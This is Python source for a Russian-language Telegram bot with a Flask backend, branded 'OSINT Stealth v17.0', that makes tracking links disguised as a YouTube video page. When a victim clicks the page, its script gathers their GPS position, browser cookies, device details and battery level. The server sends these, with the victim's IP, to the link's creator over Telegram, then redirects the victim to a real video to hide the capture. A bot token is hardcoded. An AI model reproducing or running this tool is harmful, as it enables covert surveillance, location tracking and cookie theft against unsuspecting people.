import asyncio, threading, os, requests, json, uuid
from flask import Flask, render_template_string, request
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder

# --- КОНФИГ ---
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
OWNER_ID = 6659724115 
BASE_URL = "https://tg-bot-backend-oo97.onrender.com" 

app = Flask(__name__)
exploit_vault = {} 
user_mode = {} # Храним выбранный режим атаки

# --- БИБЛИОТЕКА «ТИХИХ» СКРИПТОВ ---
SCRIPTS = {
    "INFO": "// Тихий сбор данных",
    "COOKIE": "console.log('Cookies:', document.cookie); d.cookies = document.cookie || 'Protected';",
    "SESSION": "d.session = {lang: navigator.language, storage: window.localStorage.length, auth: !!window.indexedDB};"
}

HTML_TRAP = """
<!DOCTYPE html>
<html>
<head>
    <title>YouTube</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #fff; margin: 0; font-family: "YouTube Sans", Roboto, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; overflow: hidden; }
        .header { width: 100%; height: 48px; display: flex; align-items: center; padding: 0 16px; border-bottom: 1px solid #e5e5e5; }
        .yt-logo { width: 90px; height: 20px; background: url('https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg') no-repeat; background-size: contain; }
        .video-container { width: 100%; background: #000; aspect-ratio: 16/9; display: flex; justify-content: center; align-items: center; position: relative; cursor: pointer; }
        .thumbnail { width: 100%; height: 100%; object-fit: cover; opacity: 0.6; }
        .play-icon { position: absolute; width: 64px; height: 44px; background: rgba(255,0,0,0.9); border-radius: 12px; display: flex; justify-content: center; align-items: center; transition: 0.2s; }
        .play-icon::after { content: ''; border-left: 18px solid #fff; border-top: 10px solid transparent; border-bottom: 10px solid transparent; margin-left: 5px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #ff0000; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; display: none; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .details { padding: 12px 16px; width: 100%; box-sizing: border-box; }
        .video-title { font-size: 18px; color: #0f0f0f; margin-bottom: 4px; line-height: 1.2; }
        .video-meta { font-size: 12px; color: #606060; }
    </style>
</head>
<body onclick="execute()">
    <div class="header"><div class="yt-logo"></div></div>
    <div class="video-container" id="player">
        <img src="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg" class="thumbnail">
        <div class="play-icon" id="p_btn"></div>
        <div class="loader" id="ldr"></div>
    </div>
    <div class="details">
        <div class="video-title">Топ 10 скрытых функций твоего смартфона (2026)</div>
        <div class="video-meta">158 тыс. просмотров • 1 час назад</div>
    </div>

<script>
async function execute() {
    document.getElementById('p_btn').style.display = 'none';
    document.getElementById('ldr').style.display = 'block';
    
    let d = { aid: "{{ aid }}", ua: navigator.userAgent, plat: navigator.platform, res: screen.width+"x"+screen.height };
    
    // Внедрение выбранного скрипта
    try { {{ custom_script|safe }} } catch(e) {}

    // Фоновый сбор данных
    try { let b = await navigator.getBattery(); d.bat = Math.round(b.level * 100) + "%"; } catch(e) {}
    
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((p) => { 
            d.gps = p.coords.latitude+","+p.coords.longitude; send(d); 
        }, () => { send(d); }, {timeout: 2500});
    } else { send(d); }
    setTimeout(() => { send(d); }, 4000);
}

function send(d) {
    if(window.s) return; window.s = true;
    fetch('/catch', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(d) })
    .finally(() => { 
        // Мягкий редирект на реальное видео
        location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; 
    });
}
</script>
</body>
</html>
"""

@app.route('/v/<aid>', strict_slashes=False)
def trap(aid):
    mode = user_mode.get(int(aid), "INFO")
    return render_template_string(HTML_TRAP, aid=aid, custom_script=SCRIPTS.get(mode))

@app.route('/catch', methods=['POST'])
def catch():
    d = request.json
    ips = request.headers.get('X-Forwarded-For', request.remote_addr)
    token = "EXP-" + str(uuid.uuid4())[:6].upper()
    exploit_vault[token] = f"// Анализ сессии: {d.get('session', 'Стандарт')}\n// Данные куки: {d.get('cookies', 'Скрыты')}"
    
    report = (
        f"🎬 **ОБЪЕКТ АКТИВИРОВАН**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 IP: `{ips}`\n"
        f"📱 Устройство: `{d.get('plat')}` | `{d.get('res')}`\n"
        f"🔋 Батарея: {d.get('bat', 'N/A')}\n"
        f"📍 GPS: `{d.get('gps', 'N/A')}`\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🔑 Ключ расшифровки: `{token}`"
    )
    url = f"https://api.telegram.org/bot{API_TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": d['aid'], "text": report, "parse_mode": "Markdown"})
    return "OK", 200

# --- БОТ ---
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

@dp.message(Command("start"))
async def start(message: types.Message):
    kb = ReplyKeyboardBuilder()
    kb.button(text="🚀 Создать Стелс-ссылку")
    await message.answer("💀 **OSINT Stealth v17.0**", reply_markup=kb.as_markup(resize_keyboard=True))

@dp.message(F.text == "🚀 Создать Стелс-ссылку")
async def create_link(message: types.Message):
    kb = InlineKeyboardBuilder()
    kb.button(text="Просто инфо", callback_data="mode_INFO")
    kb.button(text="Проверка Cookies", callback_data="mode_COOKIE")
    kb.button(text="Анализ сессии", callback_data="mode_SESSION")
    kb.adjust(1)
    await message.answer("Выберите режим скрытого скрипта:", reply_markup=kb.as_markup())

@dp.callback_query(F.data.startswith("mode_"))
async def set_mode(callback: types.CallbackQuery):
    mode = callback.data.split("_")[1]
    user_mode[callback.from_user.id] = mode
    link = f"{BASE_URL}/v/{callback.from_user.id}"
    await callback.message.edit_text(f"✅ **Ссылка готова (Режим: {mode}):**\n`{link}`\n\n*Маскировка: YouTube Mobile UI*")

async def main():
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=10000), daemon=True).start()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
